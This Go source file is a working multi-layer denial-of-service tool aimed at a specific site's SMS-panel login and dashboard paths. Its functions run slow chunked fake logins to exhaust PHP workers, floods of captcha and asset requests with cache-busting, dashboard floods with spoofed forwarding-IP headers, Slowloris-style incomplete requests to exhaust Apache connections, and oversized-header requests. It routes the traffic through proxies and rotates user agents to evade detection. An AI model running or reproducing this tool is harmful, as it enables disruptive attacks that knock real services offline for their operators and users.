package main

import (
	"context"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"strings"
	"time"
)

// ============================================================
// LAYER 1: FAKE LOGIN WITH SLOW CHUNKED BODY
// Targets: POST /sms/signmein with massive fake credentials
// Effect: PHP processes slow chunked body → max_execution_time exhaust
// ============================================================
func layer1Chunked(ctx context.Context, o *Orchestrator, workerID int) error {
	client := o.proxyMgr.NewClient()
	client.Timeout = 0 // No timeout — keep connection alive as long as possible

	targetURL := o.target.String() + "/sms/signmein"
	layerIdx := 0

	for {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		body := slowLoginBody()

		req, err := http.NewRequestWithContext(ctx, "POST", targetURL, body)
		if err != nil {
			o.stats.FailedRequests.Add(1)
			o.stats.Layers[layerIdx].Fail.Add(1)
			continue
		}

		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Set("User-Agent", randomUA())
		req.Header.Set("Connection", "keep-alive")
		req.Header.Set("Cache-Control", "no-cache")
		req.Header.Set("Origin", o.target.Scheme+"://"+o.target.Host)
		req.Header.Set("Referer", o.target.String()+"/sms/SignIn")

		resp, err := client.Do(req)
		o.stats.TotalRequests.Add(1)
		o.stats.Layers[layerIdx].Requests.Add(1)

		if err != nil {
			o.stats.FailedRequests.Add(1)
			o.stats.Layers[layerIdx].Fail.Add(1)
			continue
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		o.stats.SuccessRequests.Add(1)
		o.stats.Layers[layerIdx].Success.Add(1)

		time.Sleep(time.Duration(rand.Intn(50)+10) * time.Millisecond)
	}
}

// slowLoginBody returns a reader that simulates a massive login form submission.
// The body is delivered very slowly to keep the PHP worker occupied.
func slowLoginBody() io.Reader {
	r, w := io.Pipe()
	go func() {
		defer w.Close()
		// Start with username field — very long fake username
		w.Write([]byte("username=" + strings.Repeat("A", 2048)))
		time.Sleep(time.Duration(rand.Intn(300)+100) * time.Millisecond)
		// Then password — also very long
		w.Write([]byte("&password=" + strings.Repeat("B", 2048)))
		time.Sleep(time.Duration(rand.Intn(300)+100) * time.Millisecond)
		// Then captcha answer — random number
		w.Write([]byte(fmt.Sprintf("&capt=%d", rand.Intn(20)+1)))
		// Continue appending junk data to keep the connection alive
		for i := 0; i < 10; i++ {
			time.Sleep(time.Duration(rand.Intn(200)+50) * time.Millisecond)
			w.Write([]byte("&junk" + fmt.Sprintf("%d", i) + "=" + strings.Repeat("C", 512)))
		}
	}()
	return r
}

// ============================================================
// LAYER 2: CAPTCHA PAGE FLOOD + ASSET EXHAUSTION
// Targets: GET /sms/SignIn (captcha generation) + all CSS/JS assets
// Effect: Captcha generation per request + 12+ asset requests = massive CPU + Disk I/O
// ============================================================
var (
	assetPaths = []string{
		"/sms/SignIn",
		"/sms/SignIn",
		"/sms/SignIn",
		"/sms/SignIn",
		"/sms/SignIn", // 5x weight — captcha generate per GET
		"/sms/SignIn",
		"/app-assets/vendors/css/vendors.min.css",
		"/app-assets/css/bootstrap.css",
		"/app-assets/css/bootstrap-extended.css",
		"/app-assets/css/colors.css",
		"/app-assets/css/components.css",
		"/app-assets/css/core/menu/menu-types/vertical-menu.css",
		"/app-assets/css/core/colors/palette-gradient.css",
		"/app-assets/css/pages/login-register.css",
		"/assets/css/style.css",
		"/app-assets/vendors/js/vendors.min.js",
		"/app-assets/vendors/js/forms/validation/jqBootstrapValidation.js",
		"/app-assets/js/core/app-menu.js",
		"/app-assets/js/core/app.js",
		"/app-assets/js/scripts/forms/form-login-register.js",
		"/app-assets/images/logo/logo.png",
		"/app-assets/images/ico/favicon.ico",
	}
)

func layer2Recursive(ctx context.Context, o *Orchestrator, workerID int) error {
	client := o.proxyMgr.NewClientWithTimeout(15 * time.Second)
	baseURL := o.target.String()
	layerIdx := 1

	for {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		// Pick a random asset or login page to request
		path := assetPaths[rand.Intn(len(assetPaths))]
		// Always add a unique cache-busting parameter
		fullURL := fmt.Sprintf("%s%s?_=%d&r=%d",
			baseURL, path, time.Now().UnixNano(), rand.Int63())

		req, err := http.NewRequestWithContext(ctx, "GET", fullURL, nil)
		if err != nil {
			o.stats.FailedRequests.Add(1)
			o.stats.Layers[layerIdx].Fail.Add(1)
			continue
		}

		req.Header.Set("User-Agent", randomUA())
		req.Header.Set("Accept", "*/*")
		req.Header.Set("Connection", "keep-alive")
		req.Header.Set("Cache-Control", "no-cache")
		req.Header.Set("Pragma", "no-cache")

		// If requesting login page, set Referer to make it look natural
		if strings.Contains(path, "SignIn") {
			req.Header.Set("Referer", baseURL+"/sms/test/")
		} else {
			req.Header.Set("Referer", baseURL+"/sms/SignIn")
		}

		resp, err := client.Do(req)
		o.stats.TotalRequests.Add(1)
		o.stats.Layers[layerIdx].Requests.Add(1)

		if err != nil {
			o.stats.FailedRequests.Add(1)
			o.stats.Layers[layerIdx].Fail.Add(1)
			continue
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		o.stats.SuccessRequests.Add(1)
		o.stats.Layers[layerIdx].Success.Add(1)

		// Small delay — this layer is volume-based
		time.Sleep(time.Duration(rand.Intn(5)) * time.Millisecond)
	}
}

// ============================================================
// LAYER 3: DASHBOARD + MISC PAGE FLOOD
// Targets: GET /sms/test/ (dashboard), POST /sms/signmein (fake login)
// Effect: Dashboard loads 20+ assets + DB queries → heavy
// ============================================================
var (
	dashboardPaths = []string{
		"/sms/test/",
		"/sms/test/TestNumbers",
		"/sms/test/TestReports",
		"/sms/test/Profile",
		"/sms/test/ActivityLog",
		"/sms/",
		"/",
	}
)

func layer3CacheBypass(ctx context.Context, o *Orchestrator, workerID int) error {
	client := o.proxyMgr.NewClientWithTimeout(10 * time.Second)
	baseURL := o.target.String()
	layerIdx := 2

	for {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		path := dashboardPaths[rand.Intn(len(dashboardPaths))]
		fullURL := fmt.Sprintf("%s%s?_=%d&nc=%d",
			baseURL, path, time.Now().UnixNano(), rand.Int63())

		req, err := http.NewRequestWithContext(ctx, "GET", fullURL, nil)
		if err != nil {
			o.stats.FailedRequests.Add(1)
			o.stats.Layers[layerIdx].Fail.Add(1)
			continue
		}

		req.Header.Set("User-Agent", randomUA())
		req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
		req.Header.Set("Pragma", "no-cache")
		req.Header.Set("X-Forwarded-For", randomIP())
		req.Header.Set("X-Real-IP", randomIP())
		req.Header.Set("Accept", "text/html,application/xhtml+xml,*/*")
		req.Header.Set("Referer", baseURL+"/sms/SignIn")

		resp, err := client.Do(req)
		o.stats.TotalRequests.Add(1)
		o.stats.Layers[layerIdx].Requests.Add(1)

		if err != nil {
			o.stats.FailedRequests.Add(1)
			o.stats.Layers[layerIdx].Fail.Add(1)
			continue
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		o.stats.SuccessRequests.Add(1)
		o.stats.Layers[layerIdx].Success.Add(1)

		time.Sleep(time.Duration(rand.Intn(5)) * time.Millisecond)
	}
}

// ============================================================
// LAYER 4: APACHE CONNECTION POOL EXHAUSTION
// Targets: Port 80 — opens TCP connections and holds them open
// Effect: Apache KeepAliveTimeout=5 — pool size ~100 — we open thousands
// ============================================================
func layer4PoolExhaust(ctx context.Context, o *Orchestrator, workerID int) error {
	layerIdx := 3

	for {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		conn, err := o.proxyMgr.dialer.Dial("tcp", o.target.Host)
		if err != nil {
			o.stats.FailedRequests.Add(1)
			o.stats.Layers[layerIdx].Fail.Add(1)
			time.Sleep(100 * time.Millisecond)
			continue
		}

		o.stats.TotalRequests.Add(1)
		o.stats.Layers[layerIdx].Requests.Add(1)
		o.stats.SuccessRequests.Add(1)
		o.stats.Layers[layerIdx].Success.Add(1)

		// Send incomplete HTTP request — Apache waits for completion
		partialReq := fmt.Sprintf(
			"GET /sms/SignIn HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: keep-alive\r\nAccept: */*\r\n",
			o.target.Host, randomUA(),
		)
		// Note: deliberately missing final \r\n — request is incomplete
		// Apache will wait for the missing newline until timeout

		conn.SetDeadline(time.Now().Add(10 * time.Second))
		_, err = conn.Write([]byte(partialReq))
		if err != nil {
			conn.Close()
			continue
		}

		// Wait a bit, then send more garbage to keep connection alive
		for i := 0; i < 5; i++ {
			select {
			case <-ctx.Done():
				conn.Close()
				return ctx.Err()
			case <-time.After(time.Duration(rand.Intn(2000)+500) * time.Millisecond):
			}

			conn.SetDeadline(time.Now().Add(5 * time.Second))
			// Send more headers without completing the request
			junkHeader := fmt.Sprintf("X-Junk-%d: %s\r\n", i, strings.Repeat("Z", 512))
			if _, err := conn.Write([]byte(junkHeader)); err != nil {
				break
			}
		}

		conn.Close()
	}
}

// ============================================================
// LAYER 5: PARSER STRESS — OVERSIZED HEADERS
// Targets: GET /sms/SignIn with massive headers
// Effect: Apache + PHP parse 16KB+ headers → memory pressure
// ============================================================
var oversizedHeaderNames = []string{
	"X-Custom-Data", "X-Tracking-ID", "X-Session-Token",
	"X-Analytics", "X-Device-Fingerprint", "X-Request-ID",
	"X-Correlation-ID", "X-Debug-Info",
}

func layer5ParserStress(ctx context.Context, o *Orchestrator, workerID int) error {
	client := o.proxyMgr.NewClientWithTimeout(20 * time.Second)
	targetURL := o.target.String() + "/sms/SignIn"
	layerIdx := 4

	for {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		req, err := http.NewRequestWithContext(ctx, "GET", targetURL, nil)
		if err != nil {
			o.stats.FailedRequests.Add(1)
			o.stats.Layers[layerIdx].Fail.Add(1)
			continue
		}

		req.Header.Set("User-Agent", randomUA())
		req.Header.Set("Connection", "keep-alive")
		req.Header.Set("Referer", o.target.String()+"/sms/test/")

		// Add oversized headers (8KB-16KB each)
		oversizedValue := randomString(8192 + rand.Intn(8192))
		req.Header.Set("X-Oversized-Data", oversizedValue)

		// Add multiple oversized custom headers
		for _, name := range oversizedHeaderNames {
			if rand.Intn(2) == 0 {
				req.Header.Set(name, randomString(4096+rand.Intn(4096)))
			}
		}

		// Add duplicate headers — Apache merges them → CPU waste
		for i := 0; i < 50; i++ {
			req.Header.Add("X-Duplicate-Test", "value-"+intToStr(i))
		}

		// Invalid encoding header to confuse compression module
		req.Header.Set("Accept-Encoding", "gzip;q=0, identity;q=0, *;q=0, br;q=0")

		resp, err := client.Do(req)
		o.stats.TotalRequests.Add(1)
		o.stats.Layers[layerIdx].Requests.Add(1)

		if err != nil {
			o.stats.FailedRequests.Add(1)
			o.stats.Layers[layerIdx].Fail.Add(1)
			continue
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		o.stats.SuccessRequests.Add(1)
		o.stats.Layers[layerIdx].Success.Add(1)

		time.Sleep(time.Duration(rand.Intn(100)+20) * time.Millisecond)
	}
}

// ============================================================
// UTILITY FUNCTIONS
// ============================================================

var userAgents = []string{
	"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.110 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
	"Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.146 Mobile Safari/537.36",
	"Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
}

func randomUA() string {
	return userAgents[rand.Intn(len(userAgents))]
}

func randomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d",
		rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256))
}

const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

func randomString(n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

// Ensure url package is used
var _ = url.Parse
